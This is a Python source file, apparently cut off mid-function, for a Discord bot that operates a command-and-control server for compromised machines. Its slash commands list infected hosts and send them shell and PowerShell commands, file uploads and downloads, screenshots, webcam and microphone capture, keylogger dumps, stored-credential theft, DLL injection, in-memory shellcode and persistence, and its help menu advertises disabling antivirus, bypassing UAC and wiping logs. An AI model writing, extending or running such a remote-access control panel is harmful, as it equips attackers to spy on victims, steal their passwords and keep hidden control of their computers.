import base64
from datetime import datetime
import io
import subprocess
import discord
from discord.ext import commands
from discord import app_commands  # Añadir esta importación
import logging
import configparser
import os
import requests
import sys
import threading
import time

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(os.path.dirname(__file__), "..", "logs", "discord_bot.log"), encoding="utf-8"),
        logging.StreamHandler()
    ]
)

# Cargar configuración de Discord
config_bot = configparser.ConfigParser()
config_bot.read(os.path.join(os.path.dirname(__file__), "..", "config", "config_bot.ini"))

if not config_bot.has_section('DISCORD'):
    raise ValueError("No section: 'DISCORD' in the configuration file")

# Configurar bot con intents actualizados
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True  # Añadir permiso para servidores
bot = commands.Bot(command_prefix='/', intents=intents)

# Variable para rastrear si los comandos están sincronizados
commands_synced = False

# URL del servidor C&C
API_URL = "http://127.0.0.1:5000"

# Constantes
COMMANDS_CHANNEL_ID = 1342909193794879529
NOTIFICATIONS_CHANNEL_ID = 1342904780506398781

# Añadir constante para el canal de administración
ADMIN_CHANNEL_ID = 1343183118647164979

def check_channel():
    """Decorator para verificar que los comandos se ejecuten en el canal correcto."""
    async def predicate(interaction: discord.Interaction) -> bool:
        if interaction.channel_id != COMMANDS_CHANNEL_ID:
            raise ChannelError(f"Este comando solo puede usarse en el canal <#{COMMANDS_CHANNEL_ID}>")
        return True
    return app_commands.check(predicate)

def check_admin_channel():
    """Decorator para verificar que los comandos se ejecuten en el canal de administración."""
    async def predicate(interaction: discord.Interaction) -> bool:
        if interaction.channel_id != ADMIN_CHANNEL_ID:
            raise ChannelError(f"Este comando solo puede usarse en el canal <#{ADMIN_CHANNEL_ID}>")
        return True
    return app_commands.check(predicate)

# Definir error personalizado
class ChannelError(app_commands.AppCommandError):
    pass

# Eventos y comandos
@bot.event
async def on_ready():
    """Se ejecuta cuando el bot está listo."""
    global commands_synced
    try:
        if not commands_synced:  # Solo sincronizar una vez
            print("[*] Sincronizando comandos con Discord...")
            synced = await bot.tree.sync()
            commands_synced = True
            print(f"[+] {len(synced)} comandos sincronizados:")
            for cmd in synced:
                print(f"    - /{cmd.name}")
            
            # Establecer estado personalizado
            await bot.change_presence(activity=discord.Game(name="/ayuda para comandos"))
            print("[+] Bot listo para usar!")
            
            # Enviar mensaje al canal específico
            channel_id = 1342904780506398781
            try:
                channel = bot.get_channel(channel_id)
                if channel:
                    embed = discord.Embed(
                        title="🟢 Bot C&C Iniciado",
                        description="El servidor de Comando y Control está en línea y listo para usar.",
                        color=discord.Color.green(),
                        timestamp=discord.utils.utcnow()
                    )
                    embed.add_field(
                        name="Estado",
                        value="✅ Sistema operativo\n✅ API Server\n✅ Comandos sincronizados",
                        inline=False
                    )
                    embed.add_field(
                        name="Info",
                        value="Usa `/ayuda` para ver los comandos disponibles",
                        inline=False
                    )
                    await channel.send(embed=embed)
                else:
                    print(f"[-] No se pudo encontrar el canal con ID {channel_id}")
            except Exception as e:
                print(f"[-] Error enviando mensaje de inicio: {e}")
            
    except Exception as e:
        print(f"[-] Error sincronizando comandos: {e}")
        logging.error(f"Error en on_ready: {e}")

@bot.event
async def on_command_error(ctx, error):
    """Maneja errores de comandos."""
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("❌ Comando no encontrado. Usa /ayuda para ver los comandos disponibles.")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ No tienes permisos para usar este comando.")
    else:
        await ctx.send(f"❌ Error: {str(error)}")

# Para los comandos de barra, necesitamos un manejador de errores diferente
@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    """Maneja errores de comandos de aplicación."""
    try:
        if isinstance(error, ChannelError):
            await interaction.response.send_message(str(error), ephemeral=True)
        elif isinstance(error, app_commands.CommandOnCooldown):
            await interaction.response.send_message(
                f"⏳ Espera {error.retry_after:.2f}s para usar este comando de nuevo.",
                ephemeral=True
            )
        elif isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message(
                "❌ No tienes permisos para usar este comando.",
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                f"❌ Error: {str(error)}",
                ephemeral=True
            )
    except discord.errors.InteractionResponded:
        # Si ya se respondió a la interacción, usamos followup
        await interaction.followup.send(
            "❌ Se produjo un error al procesar el comando",
            ephemeral=True
        )

# Convertir comandos a slash commands
@bot.tree.command(name="listar_bots", description="Lista todos los bots conectados al servidor C&C")
@check_channel()
async def listar_bots(interaction: discord.Interaction):
    """Lista todos los bots conectados al servidor C&C."""
    await interaction.response.defer()
    try:
        response = requests.get(f"{API_URL}/listar_bots")
        if response.status_code == 200:
            data = response.json()
            if "message" in data:
                await interaction.followup.send(data["message"])
            else:
                mensaje = "🤖 **Bots Conectados:**\n\n"
                for bot in data:
                    mensaje += f"**ID:** {bot['id']}\n"
                    mensaje += f"**Sistema:** {bot.get('so', 'Desconocido')}\n"
                    mensaje += f"**IP:** {bot.get('ip', 'Desconocida')}\n"
                    mensaje += f"**Hostname:** {bot.get('hostname', 'Desconocido')}\n"
                    mensaje += f"**Última vez visto:** {bot.get('last_seen', 'Nunca')}\n"
                    mensaje += "─" * 20 + "\n"
                await interaction.followup.send(mensaje)
        else:
            await interaction.followup.send(f"❌ Error al conectar con el servidor C&C: {response.status_code}")
    except Exception as e:
        logging.error(f"Error al listar bots: {str(e)}")
        await interaction.followup.send(f"❌ Error al listar bots: {str(e)}")

@bot.tree.command(name="enviar_comando", description="Envía un comando a los bots conectados")
@check_channel()
async def enviar_comando(interaction: discord.Interaction, comando: str):
    """Envía un comando a los bots conectados."""
    await interaction.response.defer()
    try:
        # Si el comando contiene '||', separa los comandos para Windows y Linux
        if '||' in comando:
            comando_windows, comando_linux = [cmd.strip() for cmd in comando.split('||')]
        else:
            comando_windows = comando_linux = comando

        data = {
            "comando_windows": comando_windows,
            "comando_linux": comando_linux,
            "seleccion": "1"
        }
        
        await interaction.followup.send(f"🚀 Enviando comando...\nWindows: `{comando_windows}`\nLinux: `{comando_linux}`")
        
        # Usar el wrapper con timeout aumentado
        response = make_request('POST', f"{API_URL}/enviar_comando", json=data)
        await procesar_respuesta(interaction, response)
    except requests.Timeout:
        await interaction.followup.send("⚠️ Tiempo de espera agotado al enviar el comando")
    except Exception as e:
        logging.error(f"Error al enviar comando: {e}")
        await interaction.followup.send(f"❌ Error al enviar comando: {str(e)}")

@bot.tree.command(name="apagar", description="Apaga el servidor C&C y desconecta todos los bots")
@check_admin_channel()
@commands.has_permissions(administrator=True)
async def apagar(interaction: discord.Interaction):
    """Apaga el servidor C&C y desconecta todos los bots."""
    await interaction.response.defer()
    try:
        await interaction.followup.send("⚠️ Apagando servidor C&C...")
        response = requests.post(f"{API_URL}/shutdown")
        if response.status_code == 200:
            await interaction.followup.send("✅ Servidor apagado correctamente")
            await bot.close()
        else:
            await interaction.followup.send("❌ Error al apagar el servidor")
    except Exception as e:
        logging.error(f"Error al apagar el servidor: {e}")
        await interaction.followup.send(f"❌ Error al apagar el servidor: {str(e)}")

@bot.tree.command(name="sysinfo", description="Obtiene información del sistema de los bots")
@check_channel()
async def sysinfo(interaction: discord.Interaction, bot_id: int = None):
    """Obtiene información del sistema de los bots."""
    await interaction.response.defer()
    try:
        data = {
            "comando_windows": "systeminfo",
            "comando_linux": "uname -a && lsb_release -a",
            "seleccion": "4" if bot_id else "1",
            "bot_id": bot_id
        }
        
        await interaction.followup.send("🔍 Obteniendo información del sistema...")
        response = requests.post(f"{API_URL}/enviar_comando", json=data)
        if response.status_code == 200:
            data = response.json()
            for bot_id, respuesta in data.get("respuestas", {}).items():
                mensaje = f"💻 **Bot {bot_id} - Información del Sistema:**\n```\n{respuesta}\n```"
                await interaction.followup.send(mensaje)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="procesos", description="Lista los procesos en ejecución")
@check_channel()
async def procesos(interaction: discord.Interaction, bot_id: int = None):
    """Lista los procesos en ejecución."""
    await interaction.response.defer()
    try:
        data = {
            "comando_windows": "tasklist",
            "comando_linux": "ps aux",
            "seleccion": "4" if bot_id else "1",
            "bot_id": bot_id
        }
        
        await interaction.followup.send("🔍 Listando procesos...")
        response = requests.post(f"{API_URL}/enviar_comando", json=data)
        if response.status_code == 200:
            data = response.json()
            for bot_id, respuesta in data.get("respuestas", {}).items():
                mensaje = f"⚙️ **Bot {bot_id} - Procesos:**\n```\n{respuesta}\n```"
                await interaction.followup.send(mensaje)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="screenshot", description="Captura la pantalla del bot")
@check_channel()
async def screenshot(interaction: discord.Interaction, bot_id: int = None):
    """Captura la pantalla del bot."""
    await interaction.response.defer()
    try:
        # Log para depuración
        logging.info("Iniciando comando screenshot")
        
        data = {
            "comando_windows": "/screenshot",  # Cambiar a formato de comando específico
            "comando_linux": "/screenshot",
            "tipo": "screenshot",
            "seleccion": "4" if bot_id else "1",
            "bot_id": bot_id
        }
        
        await interaction.followup.send("📸 Capturando pantalla...")
        
        # Log de la petición
        logging.info(f"Enviando petición de screenshot: {data}")
        
        response = requests.post(
            f"{API_URL}/enviar_comando", 
            json=data,
            timeout=60  # Aumentar timeout a 60 segundos
        )
        
        # Log de la respuesta
        logging.info(f"Respuesta recibida. Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            logging.info(f"Datos recibidos: {str(data)[:200]}...")  # Log primeros 200 chars
            
            if "error" in data:
                await interaction.followup.send(f"❌ Error: {data['error']}")
                return
                
            if "message" in data:
                await interaction.followup.send(data["message"])
                return
                
            respuestas = data.get("respuestas", {})
            if not respuestas:
                await interaction.followup.send("❌ No se recibió ninguna respuesta")
                logging.error("No se recibieron respuestas del servidor")
                return
                
            for bot_id, respuesta in respuestas.items():
                if not respuesta:
                    await interaction.followup.send(f"❌ Error: No se recibió respuesta del Bot {bot_id}")
                    continue
                
                # Log de la respuesta del bot
                logging.info(f"Respuesta del bot {bot_id}: {str(respuesta)[:100]}...")
                
                if respuesta.startswith(("Error:", "Timeout:")):
                    await interaction.followup.send(f"❌ Bot {bot_id}: {respuesta}")
                    continue
                    
                try:
                    # Verificar formato base64
                    if not respuesta.startswith("data:image"):
                        # Log del formato inválido
                        logging.error(f"Formato inválido para bot {bot_id}. Respuesta: {str(respuesta)[:100]}...")
                        await interaction.followup.send(
                            f"❌ Bot {bot_id}: Formato de respuesta inválido\n"
                            f"Respuesta recibida: ```{str(respuesta)[:100]}...```"
                        )
                        continue
                        
                    # Procesar imagen
                    image_data = base64.b64decode(respuesta.split(',')[1])
                    file = discord.File(
                        io.BytesIO(image_data),
                        filename=f"screenshot_bot_{bot_id}.png"
                    )
                    await interaction.followup.send(
                        f"📷 Screenshot del Bot {bot_id}:",
                        file=file
                    )
                except Exception as e:
                    logging.error(f"Error procesando screenshot del bot {bot_id}: {e}")
                    await interaction.followup.send(
                        f"❌ Error procesando imagen del Bot {bot_id}: {str(e)}\n"
                        f"Respuesta recibida: ```{str(respuesta)[:100]}...```"
                    )
                    
        else:
            await interaction.followup.send(
                f"❌ Error del servidor: {response.status_code}\n"
                f"Respuesta: {response.text[:100]}..."
            )
            
    except requests.Timeout:
        await interaction.followup.send("⚠️ Tiempo de espera agotado")
        logging.error("Timeout en comando screenshot")
    except Exception as e:
        logging.error(f"Error en comando screenshot: {e}", exc_info=True)
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Nuevos comandos administrativos
@bot.tree.command(name="limpiar_bots", description="Limpia los bots inactivos de la base de datos")
@check_admin_channel()
@commands.has_permissions(administrator=True)
async def limpiar_bots(interaction: discord.Interaction):
    """Limpia los bots inactivos de la base de datos."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/admin/clean_inactive")
        if response.status_code == 200:
            data = response.json()
            await interaction.followup.send(f"✅ Se eliminaron {data['cleaned']} bots inactivos")
        else:
            await interaction.followup.send("❌ Error al limpiar bots inactivos")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="estadisticas", description="Muestra estadísticas del servidor C&C")
@check_admin_channel()
async def estadisticas(interaction: discord.Interaction):
    """Muestra estadísticas del servidor C&C."""
    await interaction.response.defer()
    try:
        response = requests.get(f"{API_URL}/admin/stats")
        if response.status_code == 200:
            stats = response.json()
            
            embed = discord.Embed(
                title="📊 Estadísticas del Servidor C&C",
                color=discord.Color.blue(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="👥 Bots Totales", value=stats.get("total_bots", 0), inline=True)
            embed.add_field(name="🟢 Bots Activos", value=stats.get("active_bots", 0), inline=True)
            embed.add_field(name="💾 Comandos Ejecutados", value=stats.get("total_commands", 0), inline=True)
            embed.add_field(name="⏰ Tiempo Activo", value=stats.get("uptime", "Desconocido"), inline=True)
            embed.add_field(name="💻 Uso de CPU", value=f"{stats.get('cpu_usage', 0)}%", inline=True)
            embed.add_field(name="🧮 Uso de RAM", value=f"{stats.get('memory_usage', 0)}%", inline=True)
            
            await interaction.followup.send(embed=embed)
        else:
            await interaction.followup.send("❌ Error al obtener estadísticas")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="reiniciar", description="Reinicia el servidor C&C")
@check_admin_channel()
@commands.has_permissions(administrator=True)
async def reiniciar(interaction: discord.Interaction):
    """Reinicia el servidor C&C."""
    await interaction.response.defer()
    try:
        await interaction.followup.send("⚠️ Reiniciando servidor C&C...")
        response = requests.post(f"{API_URL}/admin/restart")
        if response.status_code == 200:
            await interaction.followup.send("✅ Servidor reiniciado correctamente")
        else:
            await interaction.followup.send("❌ Error al reiniciar el servidor")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="configuracion", description="Muestra o modifica la configuración del servidor")
@check_admin_channel()
@commands.has_permissions(administrator=True)
async def configuracion(interaction: discord.Interaction, accion: str = "ver", clave: str = None, valor: str = None):
    """Muestra o modifica la configuración del servidor."""
    await interaction.response.defer()
    try:
        if accion == "ver":
            response = requests.get(f"{API_URL}/admin/config")
            if response.status_code == 200:
                config = response.json()
                embed = discord.Embed(
                    title="⚙️ Configuración del Servidor",
                    color=discord.Color.blue()
                )
                for key, value in config.items():
                    embed.add_field(name=key, value=str(value), inline=False)
                await interaction.followup.send(embed=embed)
            else:
                await interaction.followup.send("❌ Error al obtener configuración")
        elif accion == "modificar " and clave and valor:
            response = requests.post(
                f"{API_URL}/admin/config",
                json={"key": clave, "value": valor}
            )
            if response.status_code == 200:
                await interaction.followup.send(f"✅ Configuración actualizada: {clave} = {valor}")
            else:
                await interaction.followup.send("❌ Error al modificar configuración")
        else:
            await interaction.followup.send("❌ Uso: /configuracion [ver|modificar] [clave] [valor]")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Modificar el comando de ayuda
@bot.tree.command(name="ayuda", description="Muestra la ayuda del bot")
async def ayuda(interaction: discord.Interaction):
    """Muestra la ayuda del bot."""
    await interaction.response.defer()
    
    if interaction.channel_id == ADMIN_CHANNEL_ID:
        # Mostrar ayuda administrativa
        help_embed = discord.Embed(
            title="🛠️ Panel de Control Administrativo",
            description="Comandos disponibles para administradores",
            color=discord.Color.red()
        )
        
        # Comandos de gestión del servidor
        help_embed.add_field(
            name="🔧 Gestión del Servidor",
            value=(
                "**/apagar** - Apaga el servidor C&C y desconecta todos los bots\n"
                "**/reiniciar** - Reinicia el servidor C&C\n"
                "**/configuracion [ver|modificar]** - Gestiona la configuración del servidor\n"
                "**/limpiar_bots** - Elimina bots inactivos"
            ),
            inline=False
        )
        
        # Comandos de monitoreo
        help_embed.add_field(
            name="📊 Monitoreo y Control",
            value=(
                "**/estadisticas** - Muestra estadísticas del servidor\n"
                "**/registros** - Muestra logs del sistema\n"
                "**/proxy_config** - Configura el proxy reverso\n"
                "**/av_estado** - Estado de protecciones antivirus"
            ),
            inline=False
        )
        
        # Comandos de ejecución avanzada
        help_embed.add_field(
            name="⚡ Ejecución Avanzada",
            value=(
                "**/ejecutar_shellcode** - Ejecuta shellcode en memoria\n"
                "**/inyectar_dll** - Inyecta una DLL en un proceso\n"
                "**/persistencia** - Gestiona mecanismos de persistencia\n"
                "**/bypass_uac** - Intenta bypass de UAC"
            ),
            inline=False
        )
        
        # Advertencia de seguridad
        help_embed.add_field(
            name="⚠️ Advertencia",
            value="Estos comandos son potencialmente peligrosos. Úsalos con responsabilidad.",
            inline=False
        )
        
    else:
        # Mostrar ayuda normal
        help_embed = discord.Embed(
            title="🤖 Centro de Control C&C",
            description="Lista completa de comandos disponibles",
            color=discord.Color.blue()
        )
        
        # Comandos básicos
        help_embed.add_field(
            name="📡 Gestión de Bots",
            value=(
                "**/listar_bots** - Muestra todos los bots conectados\n"
                "**/sysinfo [bot_id]** - Obtiene información del sistema\n"
                "**/procesos [bot_id]** - Lista los procesos en ejecución\n"
                "**/conectados** - Muestra bots activos"
            ),
            inline=False
        )
        
        # Comandos de shell y ejecución
        help_embed.add_field(
            name="🖥️ Ejecución de Comandos",
            value=(
                "**/shell <comando>** - Ejecuta comando en shell\n"
                "**/powershell <comando>** - Ejecuta comando en PowerShell\n"
                "**/cmd <comando>** - Ejecuta comando en CMD\n"
                "**/ejecutar_script** - Ejecuta scripts en memoria"
            ),
            inline=False
        )
        
        # Operaciones con archivos
        help_embed.add_field(
            name="📂 Sistema de Archivos",
            value=(
                "**/listar [ruta]** - Lista archivos en directorio\n"
                "**/descargar <ruta>** - Descarga un archivo\n"
                "**/subir <archivo> <ruta>** - Sube un archivo\n"
                "**/eliminar <ruta>** - Elimina un archivo"
            ),
            inline=False
        )
        
        # Captura de datos
        help_embed.add_field(
            name="📸 Captura y Monitoreo",
            value=(
                "**/screenshot** - Captura la pantalla\n"
                "**/webcam** - Captura imagen de webcam\n"
                "**/grabar_audio [segundos]** - Graba audio\n"
                "**/keylogger [start|stop]** - Control del keylogger"
            ),
            inline=False
        )
        
        # Credenciales y datos
        help_embed.add_field(
            name="🔑 Extracción de Datos",
            value=(
                "**/credenciales** - Extrae credenciales guardadas\n"
                "**/navegadores** - Datos de navegadores\n"
                "**/registro <ruta>** - Lee registro de Windows\n"
                "**/clipboard** - Captura el portapapeles"
            ),
            inline=False
        )
        
        # Red y proxy
        help_embed.add_field(
            name="🌐 Red y Conexiones",
            value=(
                "**/conexiones** - Muestra conexiones activas\n"
                "**/proxy [start|stop]** - Control del proxy reverso\n"
                "**/puertos** - Escaneo de puertos\n"
                "**/tunneling** - Gestión de túneles"
            ),
            inline=False
        )
        
        # Persistencia y evasión
        help_embed.add_field(
            name="🛡️ Persistencia y Evasión",
            value=(
                "**/persistir** - Establece persistencia básica\n"
                "**/ocultar** - Oculta procesos y archivos\n"
                "**/deshabilitar_av** - Deshabilita protecciones\n"
                "**/limpiar_logs** - Limpia logs del sistema"
            ),
            inline=False
        )
        
        # Nota informativa
        help_embed.add_field(
            name="ℹ️ Información",
            value=(
                f"• Todos los comandos deben usarse en <#{COMMANDS_CHANNEL_ID}>\n"
                "• Usa [bot_id] para dirigir comandos a un bot específico\n"
                "• Los comandos pueden tardar unos segundos en responder\n"
                "• Usa con precaución los comandos de evasión y persistencia"
            ),
            inline=False
        )

    # Añadir pie de página común
    help_embed.set_footer(text="C&C Control Center | Usa los comandos con responsabilidad")
    await interaction.followup.send(embed=help_embed)

# Comandos para basic_commands
@bot.tree.command(name="shell", description="Ejecuta un comando en la shell del sistema")
@check_channel()
async def shell(interaction: discord.Interaction, comando: str):
    """Ejecuta un comando en la shell del sistema."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/execute_command", json={
            'command': comando,
            'type': 'shell'
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="powershell", description="Ejecuta un comando PowerShell")
@check_channel()
async def powershell(interaction: discord.Interaction, comando: str):
    """Ejecuta un comando PowerShell."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/execute_command", json={
            'command': comando,
            'type': 'powershell'
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Comandos para file_operations
@bot.tree.command(name="listar", description="Lista archivos en un directorio")
@check_channel()
async def listar(interaction: discord.Interaction, ruta: str = "."):
    """Lista archivos en un directorio."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/file_operations", json={
            'operation': 'list',
            'path': ruta
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="descargar", description="Descarga un archivo del bot")
@check_channel()
async def descargar(interaction: discord.Interaction, ruta: str):
    """Descarga un archivo del bot."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/file_operations", json={
            'operation': 'download',
            'path': ruta
        })
        if response.status_code == 200:
            data = response.json()
            if 'file_data' in data:
                # Convertir base64 a archivo
                import base64
                file_data = base64.b64decode(data['file_data'])
                file = discord.File(io.BytesIO(file_data), filename=os.path.basename(ruta))
                await interaction.followup.send(f"📥 Archivo descargado:", file=file)
            else:
                await interaction.followup.send("❌ No se pudo descargar el archivo")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="subir", description="Sube un archivo al bot")
@check_channel()
async def subir(interaction: discord.Interaction, archivo: discord.Attachment, ruta_destino: str):
    """Sube un archivo al bot."""
    await interaction.response.defer()
    try:
        file_data = await archivo.read()
        file_b64 = base64.b64encode(file_data).decode()
        
        response = requests.post(f"{API_URL}/file_operations", json={
            'operation': 'upload',
            'path': ruta_destino,
            'file_data': file_b64
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Comandos para advanced_execution
@bot.tree.command(name="ejecutar_script", description="Ejecuta un script en memoria")
@check_channel()
async def ejecutar_script(interaction: discord.Interaction, 
                         tipo: str, 
                         script: str,
                         argumentos: str = None):
    """Ejecuta un script en memoria."""
    await interaction.response.defer()
    try:
        data = {
            'type': tipo,
            'script': script,
            'args': argumentos
        }
        response = requests.post(f"{API_URL}/execute_script", json=data)
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="inyectar_dll", description="Inyecta una DLL en un proceso")
@check_channel()
async def inyectar_dll(interaction: discord.Interaction, 
                      proceso_id: int, 
                      dll: discord.Attachment):
    """Inyecta una DLL en un proceso."""
    await interaction.response.defer()
    try:
        dll_data = await dll.read()
        dll_b64 = base64.b64encode(dll_data).decode()
        
        response = requests.post(f"{API_URL}/execute_script", json={
            'type': 'dll_injection',
            'pid': proceso_id,
            'dll_data': dll_b64
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="ejecutar_shellcode", description="Ejecuta shellcode en memoria")
@check_admin_channel()
@commands.has_permissions(administrator=True)
async def ejecutar_shellcode(interaction: discord.Interaction, 
                           shellcode: str,
                           proceso_objetivo: str = None):
    """Ejecuta shellcode en memoria."""
    await interaction.response.defer()
    try:
        data = {
            'type': 'shellcode',
            'shellcode': shellcode,
            'target_process': proceso_objetivo
        }
        response = requests.post(f"{API_URL}/execute_script", json=data)
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Comandos para registro y persistencia
@bot.tree.command(name="registrar_valor", description="Modifica el registro de Windows")
@check_channel()
async def registrar_valor(interaction: discord.Interaction, 
                         hive: str, 
                         ruta: str, 
                         nombre: str, 
                         valor: str,
                         tipo: str = "REG_SZ"):
    """Modifica un valor en el registro de Windows."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/registry", json={
            'operation': 'write',
            'hive': hive,
            'path': ruta,
            'name': nombre,
            'value': valor,
            'type': tipo
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="leer_registro", description="Lee valores del registro de Windows")
@check_channel()
async def leer_registro(interaction: discord.Interaction, 
                       hive: str, 
                       ruta: str, 
                       nombre: str = None):
    """Lee valores del registro de Windows."""
    await interaction.response.defer()
    try:
        response = requests.get(f"{API_URL}/registry", params={
            'hive': hive,
            'path': ruta,
            'name': nombre
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="establecer_persistencia", description="Establece mecanismos de persistencia")
@check_admin_channel()
@commands.has_permissions(administrator=True)
async def establecer_persistencia(interaction: discord.Interaction, 
                                metodo: str = "all"):
    """Establece persistencia en el sistema."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/persistence", json={
            'method': metodo
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Comandos para proxy reverso
@bot.tree.command(name="proxy_start", description="Inicia el proxy reverso")
@check_admin_channel()
async def proxy_start(interaction: discord.Interaction, 
                     puerto_local: int,
                     host_remoto: str,
                     puerto_remoto: int):
    """Inicia un proxy reverso."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/proxy/start", json={
            'local_port': puerto_local,
            'remote_host': host_remoto,
            'remote_port': puerto_remoto
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="proxy_stop", description="Detiene el proxy reverso")
@check_admin_channel()
async def proxy_stop(interaction: discord.Interaction, 
                    puerto_local: int):
    """Detiene un proxy reverso."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/proxy/stop", json={
            'local_port': puerto_local
        })
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Comandos para keylogger
@bot.tree.command(name="keylogger_start", description="Inicia el keylogger")
@check_admin_channel()
async def keylogger_start(interaction: discord.Interaction):
    """Inicia el keylogger."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/keylogger/start")
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="keylogger_stop", description="Detiene el keylogger")
@check_admin_channel()
async def keylogger_stop(interaction: discord.Interaction):
    """Detiene el keylogger."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/keylogger/stop")
        await procesar_respuesta(interaction, response)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="keylogger_dump", description="Obtiene los logs del keylogger")
@check_admin_channel()
async def keylogger_dump(interaction: discord.Interaction):
    """Obtiene los logs del keylogger."""
    await interaction.response.defer()
    try:
        response = requests.get(f"{API_URL}/keylogger/dump")
        if response.status_code == 200:
            data = response.json()
            if len(data["logs"]) > 0:
                # Crear archivo con los logs
                log_content = "\n".join(data["logs"])
                file = discord.File(
                    io.BytesIO(log_content.encode()),
                    filename=f"keylogger_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                )
                await interaction.followup.send("📝 Logs del keylogger:", file=file)
            else:
                await interaction.followup.send("ℹ️ No hay logs disponibles")
        else:
            await interaction.followup.send("❌ Error obteniendo logs")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Comandos para captura de credenciales
@bot.tree.command(name="extraer_credenciales", description="Extrae credenciales almacenadas")
@check_admin_channel()
async def extraer_credenciales(interaction: discord.Interaction, 
                             origen: str = "all"):
    """Extrae credenciales almacenadas."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/credentials", json={
            'source': origen
        })
        if response.status_code == 200:
            data = response.json()
            if data["credentials"]:
                # Crear embed con las credenciales
                embed = discord.Embed(
                    title="🔑 Credenciales Extraídas",
                    color=discord.Color.gold()
                )
                for source, creds in data["credentials"].items():
                    if creds:
                        value = "\n".join([
                            f"URL: {c.get('url', 'N/A')}\n"
                            f"Usuario: {c.get('username', 'N/A')}\n"
                            f"Contraseña: ||{c.get('password', 'N/A')}||\n"
                            for c in creds
                        ])
                        embed.add_field(
                            name=f"📌 {source.title()}",
                            value=value[:1024] + "..." if len(value) > 1024 else value,
                            inline=False
                        )
                await interaction.followup.send(embed=embed)
            else:
                await interaction.followup.send("ℹ️ No se encontraron credenciales")
        else:
            await interaction.followup.send("❌ Error extrayendo credenciales")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Comandos para captura de audio/video
@bot.tree.command(name="webcam", description="Captura imagen de la webcam")
@check_channel()
async def webcam(interaction: discord.Interaction, 
                device_id: int = 0):
    """Captura una imagen de la webcam."""
    await interaction.response.defer()
    try:
        response = requests.post(f"{API_URL}/av/webcam", json={
            'device_id': device_id
        })
        if response.status_code == 200:
            data = response.json()
            if data["image"]:                # Convertir base64 a archivo
                image_data = base64.b64decode(data["image"].split(',')[1])
                file = discord.File(
                    io.BytesIO(image_data),
                    filename=f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                )
                await interaction.followup.send("📸 Captura de webcam:", file=file)
            else:
                await interaction.followup.send("❌ Error capturando imagen")
        else:
            await interaction.followup.send("❌ Error accediendo a la webcam")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

@bot.tree.command(name="grabar_audio", description="Graba audio del micrófono")
@check_channel()
async def grabar_audio(interaction: discord.Interaction, 
                      duracion: int = 10):
    """Graba audio del micrófono."""
    await interaction.response.defer()
    try:
        await interaction.followup.send(f"🎙️ Grabando audio ({duracion}s)...")
        response = requests.post(f"{API_URL}/av/audio", json={
            'duration': duracion
        })
